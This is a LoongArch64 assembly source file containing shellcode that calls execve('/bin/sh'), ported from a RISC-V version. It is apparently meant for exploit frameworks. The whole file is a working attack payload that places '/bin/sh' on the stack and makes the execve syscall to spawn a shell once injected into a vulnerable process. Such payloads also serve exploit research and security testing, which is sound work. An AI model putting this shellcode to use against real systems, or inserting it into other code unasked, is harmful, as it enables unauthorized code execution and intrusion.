# LoongArch64 execve(/bin/sh) shellcode
# ported to LoongArch from modexp's RISC-V shellcode:
# - https://github.com/odzhan/shellcode/blob/master/os/linux/riscv64/execve.s
# ---
# bcoles

.global _start
.section .text

_start:
    # execve("/bin/sh", NULL, NULL);
    li.d $a1, 0                  # argv = NULL
    li.d $a2, 0                  # envp = NULL
    li.d $a0, 0x0068732F6E69622F # a0 = "/bin/sh\0"
    st.d $a0, $sp, 0             # store "/bin/sh\0" on the stack
    move $a0, $sp                # a0 = sp
    li.w $a7, 221                # execve
    syscall 0x0101

